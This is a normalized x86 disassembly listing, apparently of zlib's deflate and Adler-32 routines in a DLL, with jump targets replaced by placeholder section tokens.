mov eax [ edx + 0x10 ]
test eax eax
jne r-xdata
xor eax eax
mov edx [ esi + 0x38 ]
mov eax ecx
add eax edx
jmp r-xdata
mov ecx [ esi + 0x6c ]
mov [ esi + 0x60 ] 0x0
add ecx eax
mov [ esi + 0x6c ] ecx
mov eax ecx
mov ecx [ esi + 0x38 ]
lea edx [ eax + ecx ]
mov ecx [ esi + 0x58 ]
xor eax eax
mov al [ edx ]
mov [ esi + 0x48 ] eax
shl eax cl
xor ecx ecx
mov cl [ edx + 0x1 ]
xor eax ecx
mov ecx [ esi + 0x54 ]
and eax ecx
mov [ esi + 0x48 ] eax
jmp r-xdata
cmp ecx 0x3
jb r-xdata
inc [ esi + eax * 4 + 0x988 ]
mov eax [ esi + 0x169c ]
mov edx [ esi + 0x16a0 ]
dec eax
xor ecx ecx
cmp edx eax
mov eax [ esi + 0x60 ]
mov edx [ esi + 0x80 ]
sete cl
mov ebp ecx
mov ecx [ esi + 0x74 ]
sub ecx eax
cmp eax edx
mov [ esi + 0x74 ] ecx
ja r-xdata
cmp eax 0x1
jne r-xdata
push edi
push esi
call sub_1000b220
jmp r-xdata
jmp r-xdata
mov edx [ esi + 0x6c ]
push 0x0
sub edx ecx
push edx
push eax
push esi
call sub_1000bf60
mov ecx [ esi ]
mov eax [ esi + 0x6c ]
push ecx
mov [ esi + 0x5c ] eax
call sub_1000a9d0
mov edx [ esi ]
add esp 0x14
mov eax [ edx + 0x10 ]
test eax eax
je r-xdata
test ebp ebp
je r-xdata
dec eax
mov [ esi + 0x60 ] eax
push edi
push esi
call sub_1000b390
add esp 0x8
mov [ esi + 0x60 ] eax
mov edx [ esi + 0x6c ]
mov eax [ esi + 0x38 ]
mov edi [ esi + 0x48 ]
inc edx
xor ecx ecx
mov [ esi + 0x6c ] edx
mov cl [ edx + eax + 0x2 ]
mov eax ecx
mov ecx [ esi + 0x58 ]
shl edi cl
mov ecx [ esi + 0x44 ]
xor eax edi
mov edi [ esi + 0x54 ]
and eax edi
mov edi [ esi + 0x34 ]
and edi edx
mov edx [ esi + 0x40 ]
mov [ esi + 0x48 ] eax
mov ax [ ecx + eax * 2 ]
mov [ edx + edi * 2 ] ax
mov ecx [ esi + 0x6c ]
mov edx [ esi + 0x34 ]
mov eax [ esi + 0x48 ]
and ecx edx
mov edx [ esi + 0x40 ]
xor edi edi
mov di [ edx + ecx * 2 ]
mov ecx [ esi + 0x44 ]
mov dx [ esi + 0x6c ]
mov [ ecx + eax * 2 ] dx
mov eax [ esi + 0x60 ]
dec eax
mov [ esi + 0x60 ] eax
jne r-xdata
jmp r-xdata
inc [ esi + 0x6c ]
sub_1000b220
sub esp 0x14
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x28 ]
mov esi [ edi + 0x2c ]
mov eax [ edi + 0x7c ]
mov edx [ edi + 0x6c ]
mov ecx [ edi + 0x38 ]
mov ebp [ edi + 0x78 ]
mov [ esp + 0x14 ] eax
mov eax [ edi + 0x90 ]
lea ebx [ esi - 0x106 ]
add ecx edx
cmp edx ebx
mov [ esp + 0x18 ] eax
jbe r-xdata
mov [ esp + 0x1c ] 0x0
sub edx esi
add edx 0x106
mov [ esp + 0x1c ] edx
jmp r-xdata
mov edx [ edi + 0x74 ]
cmp eax edx
mov [ esp + 0x20 ] edx
jbe r-xdata
shr [ esp + 0x14 ] 0x2
mov dl [ ecx + ebp - 0x1 ]
lea ebx [ ecx + 0x102 ]
mov [ esp + 0x28 ] dl
mov dl [ ecx + ebp ]
mov [ esp + 0x13 ] dl
mov edx [ edi + 0x8c ]
cmp ebp edx
jb r-xdata
mov esi [ esp + 0x2c ]
mov [ esp + 0x18 ] edx
mov edx [ edi + 0x34 ]
mov eax [ edi + 0x40 ]
and edx esi
xor esi esi
mov si [ eax + edx * 2 ]
mov eax [ esp + 0x1c ]
cmp esi eax
jbe r-xdata
mov al [ esp + 0x28 ]
cmp [ edx + ebp - 0x1 ] al
jne r-xdata
mov eax [ esp + 0x20 ]
cmp ebp eax
ja r-xdata
mov eax [ esp + 0x14 ]
dec eax
mov [ esp + 0x14 ] eax
jne r-xdata
mov al [ edx ]
cmp al [ ecx ]
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x14
retn
mov eax ebp
mov edx [ edi + 0x38 ]
mov al [ esp + 0x13 ]
add edx esi
cmp [ edx + ebp ] al
jne r-xdata
mov al [ edx + 0x1 ]
inc edx
cmp al [ ecx + 0x1 ]
jne r-xdata
add ecx 0x2
inc edx
mov edx ecx
lea ecx [ ebx - 0x102 ]
sub edx ebx
add edx 0x102
cmp edx ebp
jle r-xdata
mov al [ ecx + 0x1 ]
inc ecx
inc edx
cmp al [ edx ]
jne r-xdata
mov eax [ esp + 0x18 ]
mov [ edi + 0x70 ] esi
cmp edx eax
mov ebp edx
jge r-xdata
mov al [ ecx + 0x1 ]
inc ecx
inc edx
cmp al [ edx ]
jne r-xdata
mov al [ edx + ecx - 0x1 ]
mov dl [ edx + ecx ]
mov [ esp + 0x28 ] al
mov [ esp + 0x13 ] dl
mov al [ ecx + 0x1 ]
inc ecx
inc edx
cmp al [ edx ]
jne r-xdata
mov al [ ecx + 0x1 ]
inc ecx
inc edx
cmp al [ edx ]
jne r-xdata
mov al [ ecx + 0x1 ]
inc ecx
inc edx
cmp al [ edx ]
jne r-xdata
mov al [ ecx + 0x1 ]
inc ecx
inc edx
cmp al [ edx ]
jne r-xdata
mov al [ ecx + 0x1 ]
inc ecx
inc edx
cmp al [ edx ]
jne r-xdata
cmp ecx ebx
jb r-xdata
mov al [ ecx + 0x1 ]
inc ecx
inc edx
cmp al [ edx ]
jne r-xdata
sub_1000b390
push ebx
push ebp
mov ebp [ esp + 0x10 ]
push esi
mov esi [ esp + 0x10 ]
push edi
mov ecx [ esi + 0x38 ]
mov eax [ esi + 0x6c ]
add eax ecx
add ecx ebp
mov dl [ ecx ]
mov bl [ eax ]
cmp dl bl
lea edi [ eax + 0x102 ]
jne r-xdata
mov eax 0x2
mov dl [ ecx + 0x1 ]
mov bl [ eax + 0x1 ]
cmp dl bl
jne r-xdata
add eax 0x2
add ecx 0x2
sub eax edi
add eax 0x102
cmp eax 0x3
jl r-xdata
mov dl [ eax + 0x1 ]
mov bl [ ecx + 0x1 ]
inc eax
inc ecx
cmp dl bl
jne r-xdata
mov ecx [ esi + 0x74 ]
mov [ esi + 0x70 ] ebp
cmp eax ecx
jbe r-xdata
mov dl [ eax + 0x1 ]
mov bl [ ecx + 0x1 ]
inc eax
inc ecx
cmp dl bl
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
pop edi
pop esi
pop ebp
mov eax ecx
pop ebx
retn
mov dl [ eax + 0x1 ]
mov bl [ ecx + 0x1 ]
inc eax
inc ecx
cmp dl bl
jne r-xdata
mov dl [ eax + 0x1 ]
mov bl [ ecx + 0x1 ]
inc eax
inc ecx
cmp dl bl
jne r-xdata
mov dl [ eax + 0x1 ]
mov bl [ ecx + 0x1 ]
inc eax
inc ecx
cmp dl bl
jne r-xdata
mov dl [ eax + 0x1 ]
mov bl [ ecx + 0x1 ]
inc eax
inc ecx
cmp dl bl
jne r-xdata
mov dl [ eax + 0x1 ]
mov bl [ ecx + 0x1 ]
inc eax
inc ecx
cmp dl bl
jne r-xdata
cmp eax edi
jb r-xdata
mov dl [ eax + 0x1 ]
mov bl [ ecx + 0x1 ]
inc eax
inc ecx
cmp dl bl
jne r-xdata
sub_1000b460
push ecx
push ebx
push ebp
push esi
mov esi [ esp + 0x14 ]
push edi
xor ebx ebx
cmp eax 0x3
jb r-xdata
push esi
call sub_1000ad10
mov eax [ esi + 0x74 ]
mov edi [ esp + 0x20 ]
add esp 0x4
cmp eax 0x106
jae r-xdata
mov eax [ esi + 0x60 ]
mov ecx [ esi + 0x70 ]
mov edi 0x2
mov [ esi + 0x78 ] eax
test ebx ebx
mov [ esi + 0x64 ] ecx
mov [ esi + 0x60 ] edi
je r-xdata
mov eax [ esi + 0x48 ]
mov ecx [ esi + 0x58 ]
mov edx [ esi + 0x6c ]
mov ebp [ esi + 0x54 ]
mov edi [ esi + 0x34 ]
xor ebx ebx
shl eax cl
mov ecx [ esi + 0x38 ]
and edi edx
mov bl [ ecx + edx + 0x2 ]
mov ecx [ esi + 0x44 ]
mov edx [ esi + 0x40 ]
xor eax ebx
and eax ebp
mov [ esi + 0x48 ] eax
mov ax [ ecx + eax * 2 ]
mov [ edx + edi * 2 ] ax
mov ecx [ esi + 0x6c ]
mov eax [ esi + 0x34 ]
mov edx [ esi + 0x40 ]
and ecx eax
mov eax [ esi + 0x48 ]
xor ebx ebx
mov bx [ edx + ecx * 2 ]
mov ecx [ esi + 0x44 ]
mov dx [ esi + 0x6c ]
mov [ ecx + eax * 2 ] dx
test eax eax
je r-xdata
test edi edi
je r-xdata
mov eax [ esi + 0x78 ]
cmp eax 0x3
jb r-xdata
mov edx eax
mov eax [ esi + 0x80 ]
cmp edx eax
jae r-xdata
mov eax [ esi + 0x68 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
pop ecx
retn
mov eax [ esi + 0x68 ]
test eax eax
je r-xdata
cmp [ esi + 0x60 ] eax
ja r-xdata
mov eax [ esi + 0x6c ]
mov ecx [ esi + 0x2c ]
sub eax ebx
sub ecx 0x106
cmp eax ecx
ja r-xdata
mov ecx [ esi + 0x5c ]
test ecx ecx
jl r-xdata
mov eax [ esi + 0x6c ]
mov ecx [ esi + 0x38 ]
mov edx [ esi + 0x16a0 ]
mov al [ eax + ecx - 0x1 ]
mov ecx [ esi + 0x16a4 ]
mov [ esp + 0x1c ] al
mov [ ecx + edx * 2 ] 0x0
mov edx [ esi + 0x1698 ]
mov ecx [ esi + 0x16a0 ]
mov [ edx + ecx ] al
mov edx [ esp + 0x1c ]
mov ebp [ esi + 0x16a0 ]
and edx 0xff
inc ebp
lea eax [ esi + edx * 4 + 0x94 ]
mov [ esi + 0x16a0 ] ebp
inc [ eax ]
mov [ esi + 0x68 ] 0x0
mov ecx [ esi + 0x6c ]
mov eax [ esi + 0x74 ]
inc ecx
dec eax
mov [ esi + 0x68 ] 0x1
mov [ esi + 0x6c ] ecx
mov [ esi + 0x74 ] eax
jmp r-xdata
mov eax [ esi + 0x6c ]
mov ecx [ esi + 0x38 ]
mov edx [ esi + 0x16a0 ]
mov al [ eax + ecx - 0x1 ]
mov ecx [ esi + 0x16a4 ]
mov [ esp + 0x10 ] al
mov [ ecx + edx * 2 ] 0x0
mov edx [ esi + 0x1698 ]
mov ecx [ esi + 0x16a0 ]
mov [ edx + ecx ] al
mov eax [ esi + 0x16a0 ]
mov edx [ esp + 0x10 ]
inc eax
and edx 0xff
mov [ esi + 0x16a0 ] eax
inc [ esi + edx * 4 + 0x94 ]
mov ecx [ esi + 0x16a0 ]
lea eax [ esi + edx * 4 + 0x94 ]
mov eax [ esi + 0x169c ]
dec eax
cmp ecx eax
jne r-xdata
mov eax [ esi + 0x6c ]
mov ecx [ esi + 0x74 ]
mov edx [ esi + 0x16a0 ]
mov ebp [ esi + 0x16a4 ]
lea edi [ eax + ecx - 0x3 ]
mov cl [ esi + 0x78 ]
sub ax [ esi + 0x64 ]
sub cl 0x3
mov [ esp + 0x18 ] cl
dec eax
mov [ ebp + edx * 2 ] ax
mov edx [ esi + 0x1698 ]
mov ebp [ esi + 0x16a0 ]
add eax 0xffff
mov [ edx + ebp ] cl
mov edx [ esi + 0x16a0 ]
mov ecx [ esp + 0x18 ]
inc edx
mov [ esi + 0x16a0 ] edx
and ecx 0xff
xor edx edx
mov dl [ ecx + r--data ]
inc [ esi + edx * 4 + 0x498 ]
cmp ax 0x100
lea ecx [ esi + edx * 4 + 0x498 ]
jae r-xdata
mov ecx [ esi + 0x88 ]
cmp ecx edi
je r-xdata
xor eax eax
mov eax [ esi + 0x38 ]
add eax ecx
jmp r-xdata
mov eax [ esi + 0x74 ]
cmp eax 0x106
jae r-xdata
mov edx [ esi + 0x6c ]
mov ecx [ esi + 0x74 ]
inc edx
dec ecx
mov [ esi + 0x6c ] edx
mov edx [ esi ]
mov [ esi + 0x74 ] ecx
mov eax [ edx + 0x10 ]
test eax eax
je r-xdata
mov ecx [ esi + 0x5c ]
test ecx ecx
jl r-xdata
and eax 0xffff
shr eax 0x7
xor edx edx
mov dl [ eax + r--data ]
mov eax edx
and eax 0xffff
xor ecx ecx
mov cl [ eax + r--data ]
mov eax ecx
jmp r-xdata
cmp ecx 0x3
jne r-xdata
cmp ecx 0x3
je r-xdata
mov eax edi
pop edi
sub eax 0x4
pop esi
neg eax
sbb eax eax
pop ebp
and al 0xfe
pop ebx
add eax 0x3
pop ecx
retn
xor eax eax
cmp edi 0x4
setne al
pop edi
dec eax
pop esi
pop ebp
and eax 0x2
pop ebx
pop ecx
retn
xor edx edx
cmp edi 0x4
sete dl
push edx
mov edx [ esi + 0x6c ]
sub edx ecx
push edx
push eax
push esi
call sub_1000bf60
mov ecx [ esi ]
mov eax [ esi + 0x6c ]
push ecx
mov [ esi + 0x5c ] eax
call sub_1000a9d0
mov edx [ esi ]
add esp 0x14
mov eax [ edx + 0x10 ]
test eax eax
jne r-xdata
jmp r-xdata
xor eax eax
mov edx [ esi + 0x38 ]
mov eax ecx
add eax edx
jmp r-xdata
mov eax [ esi + 0x78 ]
dec eax
mov [ esi + 0x78 ] eax
jne r-xdata
mov eax [ esi + 0x48 ]
mov ecx [ esi + 0x58 ]
shl eax cl
mov ecx [ esi + 0x38 ]
xor ebx ebx
mov bl [ ecx + edx + 0x2 ]
mov ecx [ esi + 0x54 ]
xor eax ebx
mov ebx [ esi + 0x34 ]
and eax ecx
mov ecx [ esi + 0x44 ]
and ebx edx
mov edx [ esi + 0x40 ]
mov [ esi + 0x48 ] eax
mov ax [ ecx + eax * 2 ]
mov [ edx + ebx * 2 ] ax
mov ecx [ esi + 0x6c ]
mov eax [ esi + 0x34 ]
mov edx [ esi + 0x40 ]
and ecx eax
mov eax [ esi + 0x48 ]
xor ebx ebx
mov bx [ edx + ecx * 2 ]
mov ecx [ esi + 0x44 ]
mov dx [ esi + 0x6c ]
mov [ ecx + eax * 2 ] dx
inc [ esi + eax * 4 + 0x988 ]
mov eax [ esi + 0x169c ]
mov edx [ esi + 0x16a0 ]
dec eax
xor ecx ecx
cmp edx eax
mov eax [ esi + 0x78 ]
mov edx 0x1
sete cl
mov ebp ecx
mov ecx [ esi + 0x74 ]
sub edx eax
add ecx edx
add eax 0xfffffffe
mov [ esi + 0x74 ] ecx
mov [ esi + 0x78 ] eax
mov eax [ esi + 0x60 ]
cmp eax 0x5
ja r-xdata
cmp eax 0x1
jne r-xdata
push ebx
push esi
call sub_1000b220
jmp r-xdata
mov edx [ esi + 0x6c ]
push 0x0
sub edx ecx
push edx
push eax
push esi
call sub_1000bf60
mov ecx [ esi ]
mov eax [ esi + 0x6c ]
push ecx
mov [ esi + 0x5c ] eax
call sub_1000a9d0
add esp 0x14
mov ecx [ esi + 0x6c ]
inc ecx
mov edx ecx
mov [ esi + 0x6c ] ecx
cmp edx edi
ja r-xdata
mov ecx [ esi + 0x6c ]
mov [ esi + 0x68 ] 0x0
inc ecx
mov [ esi + 0x60 ] 0x2
test ebp ebp
mov [ esi + 0x6c ] ecx
je r-xdata
cmp [ esi + 0x88 ] 0x1
je r-xdata
push ebx
push esi
call sub_1000b390
add esp 0x8
mov [ esi + 0x60 ] eax
mov edx [ esi + 0x5c ]
test edx edx
jl r-xdata
mov [ esi + 0x60 ] edi
cmp eax 0x3
jne r-xdata
xor eax eax
mov eax [ esi + 0x38 ]
add eax edx
jmp r-xdata
mov edx [ esi + 0x6c ]
mov ecx [ esi + 0x70 ]
sub edx ecx
cmp edx 0x1000
jbe r-xdata
jmp r-xdata
sub ecx edx
push 0x0
push ecx
push eax
push esi
call sub_1000bf60
mov ecx [ esi ]
mov eax [ esi + 0x6c ]
push ecx
mov [ esi + 0x5c ] eax
call sub_1000a9d0
mov edx [ esi ]
add esp 0x14
mov eax [ edx + 0x10 ]
test eax eax
je r-xdata
sub_1000b900
mov ecx [ esp + 0x4 ]
push ebx
mov ebx [ esp + 0x10 ]
push esi
push edi
mov edi ecx
shr edi 0x10
and ecx 0xffff
cmp ebx 0x1
jne r-xdata
mov esi [ esp + 0x14 ]
test esi esi
jne r-xdata
mov edx [ esp + 0x14 ]
xor eax eax
mov al [ edx ]
add ecx eax
cmp ecx 0xfff1
jb r-xdata
cmp ebx 0x10
jae r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
retn
add edi ecx
cmp edi 0xfff1
jb r-xdata
sub ecx 0xfff1
cmp ebx 0x15b0
push ebp
jb r-xdata
mov eax ebx
dec ebx
test eax eax
je r-xdata
mov eax edi
pop edi
shl eax 0x10
pop esi
or eax ecx
pop ebx
retn
sub edi 0xfff1
test ebx ebx
je r-xdata
mov eax 0x5e6ea9af
mul ebx
shr edx 0xb
mov [ esp + 0x18 ] edx
cmp ecx 0xfff1
jb r-xdata
lea eax [ ebx + 0x1 ]
mov eax edi
pop ebp
shl eax 0x10
pop edi
pop esi
or eax ecx
pop ebx
retn
cmp ebx 0x10
jb r-xdata
xor eax eax
xor edx edx
mov al [ esi ]
mov dl [ esi + 0x1 ]
add ecx eax
xor eax eax
mov al [ esi + 0x2 ]
add edi ecx
add ecx edx
xor edx edx
mov dl [ esi + 0x3 ]
add edi ecx
add ecx eax
xor eax eax
mov al [ esi + 0x4 ]
add edi ecx
add ecx edx
xor edx edx
mov dl [ esi + 0x5 ]
add edi ecx
add ecx eax
xor eax eax
mov al [ esi + 0x6 ]
add edi ecx
add ecx edx
xor edx edx
mov dl [ esi + 0x7 ]
add edi ecx
add ecx eax
xor eax eax
mov al [ esi + 0x8 ]
add edi ecx
add ecx edx
xor edx edx
mov dl [ esi + 0x9 ]
add edi ecx
add ecx eax
xor eax eax
mov al [ esi + 0xa ]
add edi ecx
add ecx edx
xor edx edx
mov dl [ esi + 0xb ]
add edi ecx
add ecx eax
xor eax eax
mov al [ esi + 0xc ]
add edi ecx
add ecx edx
xor edx edx
mov dl [ esi + 0xd ]
add edi ecx
add ecx eax
xor eax eax
mov al [ esi + 0xe ]
add edi ecx
add ecx edx
xor edx edx
mov dl [ esi + 0xf ]
add edi ecx
add ecx eax
add esi 0x10
add edi ecx
add ecx edx
add edi ecx
dec ebp
jne r-xdata
mov eax ecx
xor edx edx
mov ecx 0xfff1
div ecx
mov eax edi
mov edi 0xfff1
mov ecx edx
xor edx edx
div edi
dec [ esp + 0x18 ]
mov edi edx
jne r-xdata
mov eax edi
xor edx edx
mov esi 0xfff1
pop edi
div esi
pop esi
pop ebx
mov eax edx
shl eax 0x10
or eax ecx
retn
sub ecx 0xfff1
xor edx edx
mov dl [ esi ]
add ecx edx
inc esi
add edi ecx
dec eax
jne r-xdata
mov edx ebx
dec ebx
test edx edx
je r-xdata
mov ebp ebx
shr ebp 0x4
sub ebx 0x15b0
mov ebp 0x15b
mov eax ecx
xor edx edx
mov ecx 0xfff1
mov esi 0xfff1
div ecx
mov eax edi
mov ecx edx
xor edx edx
div esi
mov edi edx
lea eax [ ebx + 0x1 ]
xor edx edx
xor eax eax
mov dl [ esi ]
mov al [ esi + 0x1 ]
add ecx edx
xor edx edx
mov dl [ esi + 0x2 ]
add edi ecx
add ecx eax
xor eax eax
mov al [ esi + 0x3 ]
add edi ecx
add ecx edx
xor edx edx
mov dl [ esi + 0x4 ]
add edi ecx
add ecx eax
xor eax eax
mov al [ esi + 0x5 ]
add edi ecx
add ecx edx
xor edx edx
mov dl [ esi + 0x6 ]
add edi ecx
add ecx eax
xor eax eax
mov al [ esi + 0x7 ]
add edi ecx
add ecx edx
xor edx edx
mov dl [ esi + 0x8 ]
add edi ecx
add ecx eax
xor eax eax
mov al [ esi + 0x9 ]
add edi ecx
add ecx edx
xor edx edx
mov dl [ esi + 0xa ]
add edi ecx
add ecx eax
xor eax eax
mov al [ esi + 0xb ]
add edi ecx
add ecx edx
xor edx edx
mov dl [ esi + 0xc ]
add edi ecx
add ecx eax
xor eax eax
mov al [ esi + 0xd ]
add edi ecx
add ecx edx
xor edx edx
mov dl [ esi + 0xe ]
add edi ecx
add ecx eax
xor eax eax
mov al [ esi + 0xf ]
add edi ecx
add ecx edx
sub ebx 0x10
add edi ecx
add ecx eax
add edi ecx
add esi 0x10
dec ebp
jne r-xdata
xor edx edx
mov dl [ esi ]
add ecx edx
inc esi
add edi ecx
dec eax
jne r-xdata
sub_1000bb70
call sub_1000bbe0
mov eax [ esp + 0x4 ]
push eax
lea ecx [ eax + 0x94 ]
lea edx [ eax + 0x988 ]
mov [ eax + 0xb18 ] ecx
lea ecx [ eax + 0xa7c ]
mov [ eax + 0xb30 ] ecx
xor ecx ecx
mov [ eax + 0xb20 ] rw-data
mov [ eax + 0xb24 ] edx
mov [ eax + 0xb2c ] rw-data
mov [ eax + 0xb38 ] rw-data
mov [ eax + 0x16b8 ] cx
mov [ eax + 0x16bc ] ecx
mov [ eax + 0x16b4 ] 0x8
call sub_1000bbf0
pop ecx
retn
sub_1000bbf0
mov edx [ esp + 0x4 ]
push esi
mov ecx 0x11e
xor esi esi
lea eax [ edx + 0x94 ]
mov [ eax ] si
add eax 0x4
dec ecx
jne r-xdata
lea eax [ edx + 0x988 ]
mov ecx 0x1e
mov [ eax ] si
add eax 0x4
dec ecx
jne r-xdata
lea eax [ edx + 0xa7c ]
mov ecx 0x13
mov [ eax ] si
add eax 0x4
dec ecx
jne r-xdata
mov [ edx + 0x16ac ] esi
mov [ edx + 0x16a8 ] esi
mov [ edx + 0x16b0 ] esi
mov [ edx + 0x16a0 ] esi
mov [ edx + 0x494 ] 0x1
pop esi
retn
sub_1000bc60
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0x16bc ]
cmp ecx 0xd
jle r-xdata
mov edx [ esp + 0x10 ]
shl edx cl
or [ eax + 0x16b8 ] dx
add ecx 0x3
mov [ eax + 0x16bc ] ecx
mov edx [ esp + 0x10 ]
push ebx
push esi
mov esi edx
shl esi cl
mov ecx [ eax + 0x8 ]
push edi
or [ eax + 0x16b8 ] si
mov esi [ eax + 0x14 ]
mov bl [ eax + 0x16b8 ]
mov [ ecx + esi ] bl
mov esi [ eax + 0x14 ]
mov edi [ eax + 0x8 ]
xor ecx ecx
mov cl [ eax + 0x16b9 ]
inc esi
mov [ eax + 0x14 ] esi
mov [ edi + esi ] cl
mov ecx [ eax + 0x14 ]
mov esi [ eax + 0x16bc ]
inc ecx
mov [ eax + 0x14 ] ecx
mov cx 0x10
sub cx si
pop edi
shr dx cl
add esi 0xfffffff3
mov [ eax + 0x16bc ] esi
pop esi
pop ebx
mov [ eax + 0x16b8 ] dx
jmp r-xdata
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
push 0x1
push ecx
push edx
push eax
call sub_1000d650
add esp 0x10
retn
sub_1000bd00
push ebx
push esi
mov esi [ esp + 0xc ]
push edi
mov eax 0x2
mov ecx [ esi + 0x16bc ]
cmp ecx 0xd
jle r-xdata
shl eax cl
or [ esi + 0x16b8 ] ax
add ecx 0x3
mov [ esi + 0x16bc ] ecx
mov edx [ esi + 0x14 ]
shl eax cl
mov ecx [ esi + 0x8 ]
or [ esi + 0x16b8 ] ax
mov al [ esi + 0x16b8 ]
mov [ ecx + edx ] al
mov ecx [ esi + 0x14 ]
mov edx [ esi + 0x8 ]
inc ecx
mov [ esi + 0x14 ] ecx
mov eax ecx
xor ecx ecx
mov cl [ esi + 0x16b9 ]
mov [ edx + eax ] cl
mov eax [ esi + 0x14 ]
inc eax
mov cx 0x10
mov [ esi + 0x14 ] eax
mov eax [ esi + 0x16bc ]
sub cx ax
mov edx 0x2
shr dx cl
add eax 0xfffffff3
mov [ esi + 0x16bc ] eax
mov [ esi + 0x16b8 ] dx
jmp r-xdata
shl eax cl
or [ esi + 0x16b8 ] ax
add ecx edx
mov [ esi + 0x16bc ] ecx
and eax 0xffff
mov edi eax
shl edi cl
mov ecx [ esi + 0x8 ]
or [ esi + 0x16b8 ] di
mov edi [ esi + 0x14 ]
mov bl [ esi + 0x16b8 ]
mov [ ecx + edi ] bl
mov edi [ esi + 0x14 ]
mov ebx [ esi + 0x8 ]
xor ecx ecx
mov cl [ esi + 0x16b9 ]
inc edi
mov [ esi + 0x14 ] edi
mov [ ebx + edi ] cl
mov ecx [ esi + 0x14 ]
mov edi [ esi + 0x16bc ]
inc ecx
mov [ esi + 0x14 ] ecx
mov cx 0x10
sub cx di
lea edx [ edi + edx - 0x10 ]
shr ax cl
mov [ esi + 0x16bc ] edx
mov [ esi + 0x16b8 ] ax
jmp r-xdata
mov ecx [ esi + 0x16bc ]
xor edx edx
mov dx [ r--data ]
mov eax 0x10
sub eax edx
cmp ecx eax
mov eax [ r--data ]
jle r-xdata
mov [ esi + 0x16b4 ] 0x7
pop edi
pop esi
pop ebx
retn
cmp ecx 0xd
mov eax 0x2
jle r-xdata
push esi
call sub_1000d540
mov ecx [ esi + 0x16bc ]
mov edx [ esi + 0x16b4 ]
sub edx ecx
add esp 0x4
add edx 0xb
cmp edx 0x9
jge r-xdata
shl eax cl
or [ esi + 0x16b8 ] ax
add ecx 0x3
mov [ esi + 0x16bc ] ecx
mov edx [ esi + 0x14 ]
shl eax cl
mov ecx [ esi + 0x8 ]
or [ esi + 0x16b8 ] ax
mov al [ esi + 0x16b8 ]
mov [ ecx + edx ] al
mov ecx [ esi + 0x14 ]
mov edx [ esi + 0x8 ]
inc ecx
mov [ esi + 0x14 ] ecx
mov eax ecx
xor ecx ecx
mov cl [ esi + 0x16b9 ]
mov [ edx + eax ] cl
mov eax [ esi + 0x14 ]
inc eax
mov cx 0x10
mov [ esi + 0x14 ] eax
mov eax [ esi + 0x16bc ]
sub cx ax
mov edx 0x2
shr dx cl
add eax 0xfffffff3
mov [ esi + 0x16bc ] eax
mov [ esi + 0x16b8 ] dx
jmp r-xdata
shl eax cl
or [ esi + 0x16b8 ] ax
add ecx edx
mov [ esi + 0x16bc ] ecx
and eax 0xffff
mov edi eax
shl edi cl
mov ecx [ esi + 0x8 ]
or [ esi + 0x16b8 ] di
mov edi [ esi + 0x14 ]
mov bl [ esi + 0x16b8 ]
mov [ ecx + edi ] bl
mov edi [ esi + 0x14 ]
mov ebx [ esi + 0x8 ]
xor ecx ecx
mov cl [ esi + 0x16b9 ]
inc edi
mov [ esi + 0x14 ] edi
mov [ ebx + edi ] cl
mov ecx [ esi + 0x14 ]
mov edi [ esi + 0x16bc ]
inc ecx
mov [ esi + 0x14 ] ecx
mov cx 0x10
sub cx di
lea edx [ edi + edx - 0x10 ]
shr ax cl
mov [ esi + 0x16bc ] edx
mov [ esi + 0x16b8 ] ax
jmp r-xdata
mov ecx [ esi + 0x16bc ]
xor edx edx
mov dx [ r--data ]
mov eax 0x10
sub eax edx
cmp ecx eax
mov eax [ r--data ]
jle r-xdata
push esi
call sub_1000d540
add esp 0x4
sub_1000bf60
push ebx
push ebp
mov ebp [ esp + 0x14 ]
push esi
mov esi [ esp + 0x10 ]
xor eax eax
push edi
mov ecx [ esi + 0x84 ]
test ecx ecx
jle r-xdata
lea ecx [ ebp + 0x5 ]
test ebp ebp
jbe r-xdata
cmp [ esi + 0x88 ] 0x4
je r-xdata
mov ebx [ esp + 0x18 ]
test ebx ebx
je r-xdata
lea ecx [ esi + 0xb18 ]
push ecx
push esi
call sub_1000c170
lea edx [ esi + 0xb24 ]
push edx
push esi
call sub_1000c170
push esi
call sub_1000c740
mov edx [ esi + 0x16a8 ]
mov ecx [ esi + 0x16ac ]
add edx 0xa
add ecx 0xa
shr edx 0x3
shr ecx 0x3
add esp 0x14
cmp ecx edx
ja r-xdata
mov eax [ esi ]
cmp [ eax + 0x2c ] 0x2
jne r-xdata
mov ecx [ esi + 0x16bc ]
mov edi [ esp + 0x20 ]
cmp ecx 0xd
lea eax [ edi + 0x2 ]
jle r-xdata
cmp ecx edx
je r-xdata
mov edi [ esp + 0x20 ]
push edi
push ebp
push ebx
push esi
call sub_1000bc60
add esp 0x10
jmp r-xdata
lea edi [ ebp + 0x4 ]
cmp edi edx
ja r-xdata
jmp r-xdata
push esi
call sub_1000d4d0
add esp 0x4
shl eax cl
or [ esi + 0x16b8 ] ax
add ecx 0x3
mov [ esi + 0x16bc ] ecx
mov edx eax
shl edx cl
mov ecx [ esi + 0x8 ]
or [ esi + 0x16b8 ] dx
mov edx [ esi + 0x14 ]
mov bl [ esi + 0x16b8 ]
mov [ ecx + edx ] bl
mov edx [ esi + 0x14 ]
mov ebx [ esi + 0x8 ]
inc edx
mov [ esi + 0x14 ] edx
mov ecx edx
xor edx edx
mov dl [ esi + 0x16b9 ]
mov [ ecx + ebx ] dl
mov ecx [ esi + 0x14 ]
mov edx [ esi + 0x16bc ]
inc ecx
mov [ esi + 0x14 ] ecx
mov cx 0x10
sub cx dx
shr ax cl
add edx 0xfffffff3
mov [ esi + 0x16bc ] edx
mov [ esi + 0x16b8 ] ax
jmp r-xdata
mov ecx [ esi + 0x16bc ]
mov edi [ esp + 0x20 ]
cmp ecx 0xd
lea edx [ edi + 0x4 ]
jle r-xdata
push esi
call sub_1000bbf0
add esp 0x4
test edi edi
je r-xdata
mov edx ecx
pop edi
pop esi
pop ebp
pop ebx
retn
push esi
call sub_1000d5d0
add esp 0x4
push r--data
push r--data
push esi
call sub_1000d090
add esp 0xc
shl edx cl
or [ esi + 0x16b8 ] dx
add ecx 0x3
mov [ esi + 0x16bc ] ecx
mov ebx edx
mov ebp [ esi + 0x8 ]
shl ebx cl
or [ esi + 0x16b8 ] bx
mov ebx [ esi + 0x14 ]
mov cl [ esi + 0x16b8 ]
mov [ ebx + ebp ] cl
